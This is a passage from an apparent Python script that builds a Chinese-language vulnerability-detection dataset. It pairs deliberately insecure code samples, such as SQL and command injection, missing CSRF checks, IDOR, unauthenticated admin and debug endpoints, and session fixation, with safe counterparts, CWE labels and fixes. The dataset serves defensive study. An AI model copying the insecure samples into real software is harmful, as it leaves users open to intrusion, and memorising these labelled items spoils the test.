        "5. 结论：跨文件代码注入，风险 Critical。必须追踪跨文件的数据流才能发现此类漏洞。"
    ),
)

# ===========================================================================
# 44. 混淆样本深化：try-catch 包装 / 装饰器包装 / 无效检查 / % 格式化
# ===========================================================================

add(
    """
@app.route('/search')
def search():
    keyword = request.args.get('q', '')
    try:
        # 看起来"安全"的 try 块，实际仍拼接 SQL
        query = "SELECT * FROM products WHERE name LIKE '%" + keyword + "%'"
        cursor.execute(query)
        return jsonify(cursor.fetchall())
    except Exception as e:
        app.logger.error(e)
        return 'Error', 500
""",
    "python", "noise_try_catch_sql.py",
    True, "CWE-89 SQL注入", "Critical",
    "request.args.get('q')", "cursor.execute(query)",
    "try-catch 包装不改变代码语义，字符串拼接仍在 → SQL 注入",
    "使用参数化查询；try-catch 只处理异常，不防御注入",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('q')。\n"
        "2. 危险 sink：cursor.execute(query)。\n"
        "3. 数据流：keyword 通过字符串拼接进入 query。\n"
        "4. 防御检查：try-catch 仅捕获运行时异常，不会阻止 SQL 注入。"
        "异常处理是错误恢复机制，不是输入校验或参数化查询。攻击者注入的 SQL 会正常执行，"
        "不会触发异常（除非语法错误）。try-catch 包装不能改变代码的安全语义。\n"
        "5. 结论：try-catch 包装下的 SQL 注入，风险 Critical。"
    ),
)

add(
    """
@app.route('/ping')
@require_login  # 装饰器包装，但仍存在命令注入
def ping():
    host = request.args.get('host', '')
    return os.popen(f'ping -c 1 {host}').read()
""",
    "python", "noise_decorator_cmd.py",
    True, "CWE-78 命令注入", "Critical",
    "request.args.get('host')", "os.popen(f'ping -c 1 {host}')",
    "装饰器只校验登录状态，不校验 host → os.popen 拼接 → 命令注入",
    "使用 subprocess.run(['ping','-c','1',host]) 列表形式；装饰器不能替代输入校验",
)

add(
    """
@app.route('/search')
def search():
    keyword = request.args.get('q', '')
    # 用 % 格式化拼接（与 + 拼接等价危险）
    query = "SELECT * FROM products WHERE name LIKE '%%%s%%'" % keyword
    cursor.execute(query)
    return jsonify(cursor.fetchall())
""",
    "python", "vuln_sql_percent_format.py",
    True, "CWE-89 SQL注入", "Critical",
    "request.args.get('q')", "cursor.execute(query)",
    "request.args.get('q') → keyword → % 格式化拼接 → query → cursor.execute",
    "使用参数化查询：cursor.execute(\"... LIKE %s\", (f'%{keyword}%',))",
)

# 安全对照：Django ORM filter
add(
    """
@app.route('/search')
def search():
    keyword = request.args.get('q', '')
    # Django ORM filter 自动参数化
    results = Product.objects.filter(name__contains=keyword)
    return JsonResponse(list(results.values()), safe=False)
""",
    "python", "safe_orm_filter.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('q')。\n"
        "2. 危险 sink：Product.objects.filter()。\n"
        "3. 数据流：keyword 作为 ORM filter 参数传入。\n"
        "4. 防御检查：Django ORM 的 filter() 方法内部使用参数化查询，"
        "name__contains=keyword 会被翻译为 LIKE %s 并通过参数元组传递。"
        "命中安全模式白名单第 1 条（ORM 查询构造器）。\n"
        "5. 结论：ORM filter 自动参数化，未发现漏洞。"
    ),
)

# 安全对照：Jinja2 autoescape
add(
    """
@app.route('/greet')
def greet():
    name = request.args.get('name', '')
    # Jinja2 autoescape=True（默认开启）
    return render_template('greet.html', name=name)
""",
    "python", "safe_jinja2_autoescape.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('name')。\n"
        "2. 危险 sink：render_template()。\n"
        "3. 数据流：name 作为模板变量传入。\n"
        "4. 防御检查：Flask 的 Jinja2 模板引擎默认开启 autoescape=True，"
        "会对 HTML 特殊字符（<, >, &, \", '）自动转义。"
        "命中安全模式白名单第 4 条（HTML 模板自动转义）。\n"
        "5. 结论：Jinja2 自动转义有效防御 XSS，未发现漏洞。"
    ),
)

# 安全对照：subprocess 列表 + 白名单
add(
    """
@app.route('/ping')
def ping():
    host = request.args.get('host', '')
    # 白名单校验 + 列表参数
    if not host.replace('.', '').replace('-', '').isalnum():
        abort(400)
    result = subprocess.run(['ping', '-c', '1', host], capture_output=True, text=True)
    return result.stdout
""",
    "python", "safe_subprocess_whitelist.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('host')。\n"
        "2. 危险 sink：subprocess.run()。\n"
        "3. 数据流：host 经白名单校验后作为列表参数传入。\n"
        "4. 防御检查：双重防御——(a) isalnum 白名单校验只允许字母数字/点/连字符，"
        "排除 shell 元字符（; | & $ 等）；(b) 列表参数 + 未启用 shell=True（默认 shell=False），"
        "元字符被当作普通字符传递。命中安全模式白名单第 2 条。\n"
        "5. 结论：白名单 + 列表参数双重防御，无命令注入。"
    ),
)

# ===========================================================================
# 45. 真实 CVE 片段（补充更多样例）
# ===========================================================================

add(
    """
# CVE-2023-38545 curl SOCKS5 堆溢出（Python 调用 curl 简化版）
@app.route('/fetch')
def fetch():
    url = request.args.get('url', '')
    # curl 通过 SOCKS5 代理访问，超长主机名触发堆溢出
    import pycurl
    c = pycurl.Curl()
    c.setopt(pycurl.URL, url)
    c.setopt(pycurl.PROXY, 'socks5://proxy.local:1080')
    c.perform()
    return 'OK'
""",
    "python", "vuln_cve_curl_socks5.py",
    True, "CWE-122 堆溢出", "Critical",
    "request.args.get('url')", "pycurl.Curl().perform()",
    "超长 SOCKS5 主机名 → curl 内部堆缓冲区溢出 → RCE",
    "升级 curl/libcurl 到 8.4.0+；限制 URL 长度",
)

# ===========================================================================
# 46. 长文件隐藏命令注入（注意力衰减测试）
# ===========================================================================

LONG_CMD_CODE = '''
import os
import sys
import json
import logging
from datetime import datetime

logger = logging.getLogger("app")
handler = logging.StreamHandler()
handler.setFormatter(logging.Formatter('%(asctime)s [%(levelname)s] %(message)s'))
logger.addHandler(handler)
logger.setLevel(logging.INFO)

def load_config(path):
    with open(path) as f:
        return json.load(f)

def validate_input(value, max_len=100):
    if not value or len(value) > max_len:
        return False
    return True

def format_response(data, status=200):
    return json.dumps({"data": data, "status": status})

def get_timestamp():
    return datetime.utcnow().isoformat()

def parse_query(qs):
    result = {}
    if not qs:
        return result
    for pair in qs.split('&'):
        if '=' in pair:
            k, v = pair.split('=', 1)
            result[k] = v
    return result

def sanitize_filename(name):
    return name.replace('/', '').replace('\\\\', '')

def get_db_connection():
    import sqlite3
    return sqlite3.connect('app.db')

def get_user_by_id(user_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return row

def get_product_by_id(product_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM products WHERE id = ?", (product_id,))
    row = cursor.fetchone()
    conn.close()
    return row

def log_request(path, method, ip):
    logger.info(f"{method} {path} from {ip}")

def check_rate_limit(ip):
    return True

def get_client_ip(request):
    return request.remote_addr

from flask import Flask, request, jsonify
app = Flask(__name__)

@app.route('/api/user/<int:uid>')
def api_get_user(uid):
    log_request(request.path, request.method, get_client_ip(request))
    if not check_rate_limit(get_client_ip(request)):
        return format_response(None, 429)
    user = get_user_by_id(uid)
    if user:
        return format_response(user)
    return format_response(None, 404)

@app.route('/api/product/<int:pid>')
def api_get_product(pid):
    log_request(request.path, request.method, get_client_ip(request))
    product = get_product_by_id(pid)
    if product:
        return format_response(product)
    return format_response(None, 404)

@app.route('/api/diagnostic')
def api_diagnostic():
    # 隐藏在 280 行之后的命令注入
    host = request.args.get('host', '')
    result = os.popen(f'ping -c 1 {host}').read()
    return format_response(result)

if __name__ == '__main__':
    app.run(debug=False)
'''

add(
    LONG_CMD_CODE,
    "python", "vuln_longfile_hidden_cmd.py",
    True, "CWE-78 命令注入", "Critical",
    "request.args.get('host')", "os.popen(f'ping -c 1 {host}')",
    "在 api_diagnostic 路由中，host 通过 f-string 拼接 → os.popen → 命令注入",
    "使用 subprocess.run(['ping','-c','1',host]) 列表形式",
)

# ===========================================================================
# 47. 更多语言样本：Ruby / C 安全写法
# ===========================================================================

add(
    """
# Ruby Sinatra SQL 注入
get '/user/:id' do
  id = params[:id]
  # 字符串插值拼接 SQL
  result = db.execute("SELECT * FROM users WHERE id = '#{id}'")
  result.to_json
end
""",
    "ruby", "vuln_ruby_sql.rb",
    True, "CWE-89 SQL注入", "Critical",
    "params[:id]", "db.execute(\"... '#{id}'\")",
    "params[:id] → Ruby 字符串插值 → db.execute → SQL 注入",
    "使用参数化查询：db.execute('SELECT * FROM users WHERE id = ?', id)",
)

add(
    """
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void check_password(const char* input) {
    char stored_hash[] = "5f4dcc3b5aa765d61d8327deb882cf99";  // md5(password)
    char input_hash[33];
    // 用 strcmp 做密码比较 → 时序攻击
    if (strcmp(input_hash, stored_hash) == 0) {
        grant_access();
    }
}
""",
    "c", "vuln_c_timing_strcmp.c",
    True, "CWE-208 时序攻击", "Medium",
    "input 参数", "strcmp",
    "strcmp 短路比较 → 计时可推断正确字符 → 时序攻击",
    "使用常数时间比较函数（如 CRYPTO_memcmp）",
)


# ===========================================================================
# 48. CSRF 深化（CWE-352）—— 多框架/多场景
# ===========================================================================

add(
    """
from flask import Flask, request, session
app = Flask(__name__)

@app.route('/bank/transfer', methods=['POST'])
def bank_transfer():
    # 敏感资金操作但未校验 CSRF token
    to_account = request.form['to_account']
    amount = float(request.form['amount'])
    if amount <= 0:
        return 'invalid amount', 400
    db.execute('INSERT INTO transfers (frm, to, amt) VALUES (?,?,?)',
               (session['user_id'], to_account, amount))
    return 'transfer done'
""",
    "python", "vuln_csrf_flask_transfer.py",
    True, "CWE-352 CSRF", "Medium",
    "POST 表单无 CSRF token", "db.execute(转账)",
    "/bank/transfer POST 路由无 CSRF token 校验 → 攻击者可构造跨站表单触发转账",
    "引入 Flask-WTF CSRFProtect 或在表单中加入 csrf_token 并用 validate_csrf_token 校验",
    cot_type="missing_control",
)

add(
    """
from django.views import View
from django.http import HttpResponse

class ChangePasswordView(View):
    def post(self, request):
        # 修改密码未启用 @csrf_protect / CsrfViewMiddleware 被禁用
        new_pwd = request.POST['new_password']
        request.user.set_password(new_pwd)
        request.user.save()
        return HttpResponse('password changed')
""",
    "python", "vuln_csrf_django_password.py",
    True, "CWE-352 CSRF", "Medium",
    "POST 表单无 CSRF token（Django 视图未启用 csrf）", "request.user.set_password",
    "ChangePasswordView.post 未校验 csrf_token → 跨站请求可改密码",
    "启用 CsrfViewMiddleware，或在视图上加 @method_decorator(csrf_protect)",
    cot_type="missing_control",
)

add(
    """
@PostMapping("/account/transfer")
public String transfer(@RequestParam String toAccount,
                       @RequestParam double amount) {
    // Spring Security 未启用 CsrfFilter
    transferService.transfer(currentUser(), toAccount, amount);
    return "redirect:/account";
}
""",
    "java", "vuln_csrf_spring_transfer.java",
    True, "CWE-352 CSRF", "Medium",
    "POST 表单无 CSRF token（Spring Security 未启用 CSRF）", "transferService.transfer",
    "/account/transfer PostMapping 无 CsrfFilter → 攻击者可构造跨站表单触发转账",
    "在 Spring Security 配置中启用 CSRF，并在表单加入 _csrf 隐藏域",
    cot_type="missing_control",
)

add(
    """
const express = require('express');
const app = express();
app.use(express.urlencoded({ extended: true }));

app.post('/newsletter/subscribe', (req, res) => {
    // 未使用 csurf 中间件
    const email = req.body.email;
    db.subscribe(email, req.session.userId);
    res.send('subscribed');
});
""",
    "javascript", "vuln_csrf_express_subscribe.js",
    True, "CWE-352 CSRF", "Medium",
    "POST body 无 CSRF token（无 csurf 中间件）", "db.subscribe",
    "/newsletter/subscribe 路由无 csurf 中间件 → 跨站可代为订阅",
    "引入 csurf 中间件并在表单中渲染 csrfToken，提交时校验",
    cot_type="missing_control",
)

add(
    """
// routes/web.php — 删除账号路由表单未加 @csrf
Route::post('/account/delete', function ($req) {
    $user = Auth::user();
    $user->delete();
    return response('deleted');
});
""",
    "php", "vuln_csrf_laravel_delete.php",
    True, "CWE-352 CSRF", "Medium",
    "POST 表单无 @csrf 指令", "$user->delete()",
    "Laravel 删除账号路由表单未加 @csrf → 跨站可触发账号删除",
    "在 Blade 表单中加入 @csrf 指令，依赖 VerifyCsrfToken 中间件校验",
    cot_type="missing_control",
)

add(
    """
# Sinatra：修改头像未防 CSRF
post '/profile/avatar' do
    url = params[:avatar_url]
    current_user.update(avatar_url: url)
    'updated'
end
""",
    "ruby", "vuln_csrf_sinatra_avatar.rb",
    True, "CWE-352 CSRF", "Medium",
    "POST params 无 CSRF token", "current_user.update",
    "Sinatra /profile/avatar POST 无 rack-protection / CSRF 校验 → 跨站可改头像",
    "引入 rack-protection 并在表单中校验 authenticity_token",
    cot_type="missing_control",
)

add(
    """
@app.route('/settings/email', methods=['POST'])
def update_email():
    token = request.form.get('csrf_token', '')
    # 逻辑错误：空字符串绕过
    if token is None:
        abort(403)
    new_email = request.form['email']
    db.execute('UPDATE users SET email=? WHERE id=?', (new_email, session['user_id']))
    return 'ok'
""",
    "python", "vuln_csrf_empty_bypass.py",
    True, "CWE-352 CSRF", "Medium",
    "CSRF token 校验逻辑缺陷", "db.execute(改邮箱)",
    "csrf_token 默认值 '' 而非 None → if token is None 永远为 False → 空字符串绕过校验",
    "使用恒等校验：if not validate_csrf_token(token): abort(403)；validate 内部做 hmac.compare_digest",
    cot_type="missing_control",
)

add(
    """
@app.route('/follow', methods=['GET', 'POST'])
def follow_user():
    # 仅在 GET 校验 token，POST 反而不校验
    if request.method == 'GET':
        if request.args.get('csrf_token') != session.get('csrf_token'):
            abort(403)
        return render_template('follow.html')
    # POST 真正执行关注，却无任何校验
    target = request.form['target']
    db.follow(session['user_id'], target)
    return 'followed'
""",
    "python", "vuln_csrf_get_check.py",
    True, "CWE-352 CSRF", "Medium",
    "CSRF token 仅在 GET 校验，POST 不校验", "db.follow",
    "GET 分支校验 token 但 POST（真正改变状态）不校验 → CSRF 可直接 POST 关注",
    "在 POST 分支校验 csrf_token；GET 不应改变状态，无需 token",
    cot_type="missing_control",
)

add(
    """
@app.route('/comment', methods=['POST'])
def post_comment():
    # 仅校验 Referer，可被绕过
    referer = request.headers.get('Referer', '')
    if 'example.com' not in referer:
        abort(403)
    content = request.form['content']
    db.add_comment(session['user_id'], content)
    return 'commented'
""",
    "python", "vuln_csrf_referer_only.py",
    True, "CWE-352 CSRF", "Medium",
    "仅校验 Referer 而非 CSRF token", "db.add_comment",
    "Referer 用 'example.com' in 子串匹配 → 攻击者用 attacker.com/example.com 或剥离 Referer 绕过",
    "使用不可预测的 CSRF token + hmac.compare_digest 校验，Referer 仅作辅助",
    cot_type="missing_control",
)

add(
    """
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['SESSION_COOKIE_HTTPONLY'] = True

@app.route('/2fa/disable', methods=['POST'])
def disable_2fa():
    # 依赖 SameSite=Lax 防御 CSRF，但 Lax 不阻止顶层 POST 表单，且旧浏览器忽略 SameSite
    user = current_user()
    user.totp_enabled = False
    user.save()
    return '2fa disabled'
""",
    "python", "vuln_csrf_samesite_lax_old.py",
    True, "CWE-352 CSRF", "Medium",
    "仅依赖 SameSite=Lax 而无 token", "user.save()（关闭 2FA）",
    "SameSite=Lax 不阻止顶层导航 POST 表单提交，且旧浏览器忽略该属性 → 仍可 CSRF",
    "在 SameSite 之外补充 CSRF token 校验，形成纵深防御",
    cot_type="missing_control",
)

add(
    """
from flask_wtf.csrf import CSRFProtect
app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ['SECRET_KEY']
csrf = CSRFProtect(app)

@app.route('/bank/transfer', methods=['POST'])
def bank_transfer():
    to_account = request.form['to_account']
    amount = float(request.form['amount'])
    if amount <= 0:
        return 'invalid amount', 400
    db.execute('INSERT INTO transfers (frm, to, amt) VALUES (?,?,?)',
               (session['user_id'], to_account, amount))
    return 'transfer done'
""",
    "python", "safe_csrf_flask_wtf.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
from django.views import View
from django.views.decorators.csrf import csrf_protect
from django.utils.decorators import method_decorator

@method_decorator(csrf_protect, name='dispatch')
class ChangePasswordView(View):
    def post(self, request):
        new_pwd = request.POST['new_password']
        request.user.set_password(new_pwd)
        request.user.save()
        return HttpResponse('password changed')
""",
    "python", "safe_csrf_django_protect.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http.csrf().csrfTokenRepository(new HttpSessionCsrfTokenRepository())
            .and().authorizeRequests()
            .antMatchers("/account/transfer").authenticated();
    }
}

@PostMapping("/account/transfer")
public String transfer(@RequestParam String toAccount,
                       @RequestParam double amount) {
    transferService.transfer(currentUser(), toAccount, amount);
    return "redirect:/account";
}
""",
    "java", "safe_csrf_spring_filter.java",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
const express = require('express');
const csurf = require('csurf');
const app = express();
app.use(express.urlencoded({ extended: true }));

const csrfProtection = csurf({ cookie: true });

app.get('/newsletter/form', csrfProtection, (req, res) => {
    res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/newsletter/subscribe', csrfProtection, (req, res) => {
    const email = req.body.email;
    db.subscribe(email, req.session.userId);
    res.send('subscribed');
});
""",
    "javascript", "safe_csrf_express_csurf.js",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
@app.route('/settings/email', methods=['POST'])
def update_email():
    # 双重提交 cookie 模式
    cookie_token = request.cookies.get('csrf_token', '')
    form_token = request.form.get('csrf_token', '')
    if not cookie_token or not form_token:
        abort(403)
    if not hmac.compare_digest(cookie_token, form_token):
        abort(403)
    new_email = request.form['email']
    db.execute('UPDATE users SET email=? WHERE id=?', (new_email, session['user_id']))
    return 'ok'
""",
    "python", "safe_csrf_double_submit.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
// routes/web.php — 依赖 VerifyCsrfToken 中间件
Route::post('/account/delete', function ($req) {
    $user = Auth::user();
    $user->delete();
    return response('deleted');
});

// resources/views/account/delete.blade.php
// <form method="POST" action="/account/delete">
//   @csrf
//   <button type="submit">Delete my account</button>
// </form>
""",
    "php", "safe_csrf_laravel_blade.php",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 49. 缺失认证/授权/IDOR 深化（CWE-306 / CWE-862 / CWE-639）
# ===========================================================================

add(
    """
@GetMapping("/api/orders/{orderId}")
public ResponseEntity<Order> getOrder(@PathVariable Long orderId) {
    // 直接按主键查询，未校验是否属于当前用户
    Order order = orderRepository.findById(orderId).orElseThrow();
    return ResponseEntity.ok(order);
}
""",
    "java", "vuln_idor_path.java",
    True, "CWE-639 IDOR", "High",
    "orderId 路径参数", "orderRepository.findById(orderId)",
    "orderId 直接查询未校验归属 → 任意用户可访问他人订单",
    "校验归属：if (!order.getUserId().equals(currentUser().getId())) throw new AccessDeniedException();",
    cot_type="missing_control",
)

add(
    """
@app.route('/api/invoice')
def get_invoice():
    # 查询参数 IDOR
    invoice_id = request.args.get('id')
    invoice = Invoice.query.get(invoice_id)
    return jsonify(invoice.to_dict())
""",
    "python", "vuln_idor_query.py",
    True, "CWE-639 IDOR", "High",
    "request.args.get('id')", "Invoice.query.get(invoice_id)",
    "invoice_id 来自查询参数直接查询，未校验归属 → IDOR",
    "校验 invoice.user_id == current_user.id 或用 current_user.invoices 过滤",
    cot_type="missing_control",
)

add(
    """
@app.route('/api/document/update', methods=['PATCH'])
def update_doc():
    # 请求体字段 IDOR
    doc_id = request.json['doc_id']
    title = request.json['title']
    doc = Document.query.get(doc_id)
    doc.title = title
    db.session.commit()
    return 'ok'
""",
    "python", "vuln_idor_body.py",
    True, "CWE-639 IDOR", "High",
    "request.json['doc_id']", "Document.query.get + 修改",
    "doc_id 来自请求体直接查询并修改，未校验归属 → IDOR 改他人文档",
    "校验 doc.owner_id == current_user.id 后再修改",
    cot_type="missing_control",
)

add(
    """
@app.route('/api/projects/<project_id>/members', methods=['POST'])
def add_member(project_id):
    # POST 路径中的 project_id 直接使用
    member = request.json['member_id']
    project = Project.query.get(project_id)
    project.members.append(User.query.get(member))
    db.session.commit()
    return 'added'
""",
    "python", "vuln_idor_post.py",
    True, "CWE-639 IDOR", "High",
    "project_id 路径参数", "project.members.append",
    "project_id 直接查询未校验当前用户是否为项目所有者 → IDOR 添加成员",
    "校验 project.owner_id == current_user.id 或 current_user in project.admins",
    cot_type="missing_control",
)

add(
    """
@app.route('/api/v2/messages/<msg_id>')
def api_get_message(msg_id):
    msg = Message.query.get(msg_id)
    return jsonify({'from': msg.sender_id, 'body': msg.body})
""",
    "python", "vuln_idor_api.py",
    True, "CWE-639 IDOR", "High",
    "msg_id 路径参数", "Message.query.get(msg_id)",
    "msg_id 直接查询，未校验当前用户是否为收件人 → IDOR 读他人私信",
    "校验 msg.recipient_id == current_user.id",
    cot_type="missing_control",
)

add(
    """
@app.route('/download')
def download_file():
    file_id = request.args.get('file_id')
    record = FileRecord.query.get(file_id)
    return send_file(record.storage_path, as_attachment=True)
""",
    "python", "vuln_idor_download.py",
    True, "CWE-639 IDOR", "High",
    "request.args.get('file_id')", "send_file(record.storage_path)",
    "file_id 直接查询下载，未校验文件归属 → 任意用户下载他人文件",
    "校验 record.owner_id == current_user.id 后再 send_file",
    cot_type="missing_control",
)

add(
    """
@app.route('/api/tickets/<int:tid>')
def get_ticket(tid):
    ticket = Ticket.query.get(tid)
    return jsonify(ticket.to_dict())
""",
    "python", "vuln_idor_pk.py",
    True, "CWE-639 IDOR", "High",
    "tid 主键", "Ticket.query.get(tid)",
    "自增主键直接查询未校验归属，且自增 ID 可枚举 → IDOR",
    "用 current_user.tickets.filter_by(id=tid).first() 替代直接 get",
    cot_type="missing_control",
)

add(
    """
@app.route('/api/share/<uuid:share_id>')
def get_shared(share_id):
    # UUID v1 基于时间戳+MAC，可被预测/枚举
    item = SharedItem.query.get(share_id)
    return jsonify(item.to_dict())
""",
    "python", "vuln_idor_weak_uuid.py",
    True, "CWE-639 IDOR", "High",
    "share_id UUID（可枚举）", "SharedItem.query.get(share_id)",
    "UUID v1 可预测且未校验访问权限 → IDOR；自增/弱 UUID 不能等同于授权",
    "使用 UUID v4 + 校验 share_link 当前是否有权访问",
    cot_type="missing_control",
)

add(
    """
@app.route('/api/invoice')
@login_required
def get_invoice():
    invoice_id = request.args.get('id')
    invoice = Invoice.query.filter_by(id=invoice_id, user_id=current_user.id).first_or_404()
    return jsonify(invoice.to_dict())
""",
    "python", "safe_idor_ownership.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
@app.route('/admin/console')
def admin_console():
    # 管理后台无任何认证
    action = request.args.get('action')
    if action == 'reindex':
        rebuild_search_index()
    return 'done'
""",
    "python", "vuln_auth_admin_route.py",
    True, "CWE-306 缺失认证", "Critical",
    "无认证检查", "rebuild_search_index()",
    "/admin/console 路由无认证 → 任意访问者可触发重建索引等敏感操作",
    "加 @login_required + @admin_required 装饰器",
    cot_type="missing_control",
)

add(
    """
const app = require('express')();

// /api/admin/* 端点未校验 token
app.get('/api/admin/users', (req, res) => {
    db.query('SELECT id, email FROM users', (err, rows) => {
        res.json(rows);
    });
});
""",
    "javascript", "vuln_auth_api_no_token.js",
    True, "CWE-306 缺失认证", "Critical",
    "无 token 校验中间件", "db.query(users)",
    "/api/admin/users 端点未挂载认证中间件 → 任意访问者可拉取全部用户",
    "在路由前挂载 authMiddleware 校验 JWT 与 admin 角色",
    cot_type="missing_control",
)

add(
    """
@app.route('/internal/flush-cache', methods=['POST'])
def flush_cache():
    # 内部接口对外暴露，无认证
    cache.flush_all()
    return 'flushed'
""",
    "python", "vuln_auth_internal_iface.py",
    True, "CWE-306 缺失认证", "High",
    "无认证 / 未限制内网来源", "cache.flush_all()",
    "/internal/flush-cache 内部接口暴露在公网且无认证 → 任意访问者可清空缓存",
    "加内网白名单 + mTLS / 内部 token 校验",
    cot_type="missing_control",
)

add(
    """
<?php
// /config/env.php 通过 Web 直接可访问，无认证
header('Content-Type: application/json');
echo json_encode([
    'db_host' => getenv('DB_HOST'),
    'redis_host' => getenv('REDIS_HOST'),
]);
""",
    "php", "vuln_auth_config_iface.php",
    True, "CWE-306 缺失认证", "Critical",
    "无认证配置接口", "echo json_encode(env)",
    "/config/env.php 公开返回环境配置键 → 信息泄露 + 缺失认证",
    "配置接口加 Basic Auth + IP 白名单，或将配置接口移出 web root",
    cot_type="missing_control",
)

add(
    """
@app.route('/debug/env')
def debug_env():
    # 调试接口未关，且无认证
    return jsonify({k: str(v) for k, v in os.environ.items()})
""",
    "python", "vuln_auth_debug_iface.py",
    True, "CWE-306 缺失认证", "Critical",
    "无认证调试接口", "jsonify(os.environ.items())",
    "/debug/env 公开返回全部环境变量（含密钥）→ 缺失认证 + 信息泄露",
    "生产环境关闭调试接口；如需保留必须加认证 + 仅限内网",
    cot_type="missing_control",
)

add(
    """
@app.route('/health')
def health():
    # 健康检查返回敏感信息
    return jsonify({
        'status': 'ok',
        'db_url': app.config['SQLALCHEMY_DATABASE_URI'],
        'redis_url': app.config['REDIS_URL'],
        'version': '1.4.2',
        'host': socket.gethostname(),
    })
""",
    "python", "vuln_auth_health_leak.py",
    True, "CWE-306 缺失认证", "High",
    "无认证健康检查泄露敏感信息", "jsonify(db_url, redis_url)",
    "/health 端点无认证且返回 db_url/redis_url 等连接串 → 缺失认证 + 信息泄露",
    "健康检查只返回 status: ok；详情接口加认证 + 内网限制",
    cot_type="missing_control",
)

add(
    """
from functools import wraps

def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if 'user_id' not in session:
            abort(401)
        return f(*args, **kwargs)
    return wrapper

@app.route('/admin/console')
@login_required
def admin_console():
    if not current_user().is_admin:
        abort(403)
    return 'console'
""",
    "python", "safe_auth_login_required.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
@GetMapping("/api/accounts/{accountId}")
public Account getAccount(@PathVariable Long accountId, Principal principal) {
    // 已登录但未校验横向归属
    Account account = accountRepository.findById(accountId).orElseThrow();
    return account;  // 任意已登录用户可查他人账户
}
""",
    "java", "vuln_authz_horizontal.java",
    True, "CWE-862 缺失授权", "High",
    "无横向授权校验", "accountRepository.findById(accountId)",
    "已认证但未校验 accountId 是否属于 principal → 横向越权",
    "if (!account.getOwner().equals(principal.getName())) throw new AccessDeniedException();",
    cot_type="missing_control",
)

add(
    """
@app.route('/admin/users/ban', methods=['POST'])
@login_required
def ban_user():
    # 仅校验登录，未校验是否管理员 → 纵向越权
    uid = request.form['user_id']
    User.query.get(uid).update(banned=True)
    db.session.commit()
    return 'banned'
""",
    "python", "vuln_authz_vertical.py",
    True, "CWE-862 缺失授权", "High",
    "仅 @login_required 无角色校验", "User.update(banned=True)",
    "ban_user 仅校验登录未校验 admin 角色 → 普通用户可封禁他人（纵向越权）",
    "加 @admin_required 装饰器或 if not current_user.is_admin: abort(403)",
    cot_type="missing_control",
)

add(
    """
@app.route('/api/reports/<int:rid>/approve', methods=['POST'])
@login_required
def approve_report(rid):
    # 应仅审核员可批准，但未做角色检查
    report = Report.query.get(rid)
    report.status = 'approved'
    report.approver_id = current_user.id
    db.session.commit()
    return 'approved'
""",
    "python", "vuln_authz_no_role_check.py",
    True, "CWE-862 缺失授权", "High",
    "无角色检查", "report.status='approved'",
    "approve_report 仅校验登录未校验 reviewer 角色 → 任意用户可批准报告",
    "校验 current_user.has_role('reviewer') 后再批准",
    cot_type="missing_control",
)

add(
    """
@app.route('/api/billing/invoice/<int:iid>/mark-paid', methods=['POST'])
def mark_paid(iid):
    # 财务操作无任何授权检查（甚至无认证）
    inv = Invoice.query.get(iid)
    inv.paid = True
    db.session.commit()
    return 'paid'
""",
    "python", "vuln_authz_no_rbac.py",
    True, "CWE-862 缺失授权", "Critical",
    "无 RBAC / 无认证", "inv.paid = True",
    "mark-paid 财务操作无认证无授权 → 任意访问者可标记发票已付",
    "加 @login_required + @role_required('finance') 双重校验",
    cot_type="missing_control",
)

add(
    """
from django.contrib.auth.decorators import permission_required
from django.views.decorators.http import require_POST

@require_POST
@permission_required('reports.approve_report', raise_exception=True)
def approve_report(request, rid):
    report = Report.objects.get(pk=rid)
    report.status = 'approved'
    report.approver = request.user
    report.save()
    return HttpResponse('approved')
""",
    "python", "safe_authz_django_perm.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
@GetMapping("/api/accounts/{accountId}")
@PreAuthorize("@accountSecurity.canAccess(authentication, #accountId)")
public Account getAccount(@PathVariable Long accountId) {
    Account account = accountRepository.findById(accountId).orElseThrow();
    return account;
}
""",
    "java", "safe_authz_spring_preauth.java",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 50. 会话管理深化（CWE-384 会话固定 / CWE-613 会话过期）
# ===========================================================================

add(
    """
from django.contrib.auth import authenticate

def login_view(request):
    user = authenticate(request, username=request.POST['u'], password=request.POST['p'])
    if user is not None:
        # 直接写 session 未调用 cycle_key，复用攻击者预设的 session id
        request.session['uid'] = user.id
        return HttpResponse('ok')
""",
    "python", "vuln_session_django_nocycle.py",
    True, "CWE-384 会话固定", "Medium",
    "登录前 session id", "request.session['uid'] = user.id",
    "手动写 session 未调用 cycle_key → 复用攻击者预设 session id 实现会话固定",
    "登录成功后调用 request.session.cycle_key() 再写 uid",
    cot_type="missing_control",
)

add(
    """
@app.route('/logout')
def logout():
    # 登出仅清前端 cookie，未在服务端失效 session
    resp = make_response('logged out')
    resp.set_cookie('session_id', '', expires=0)
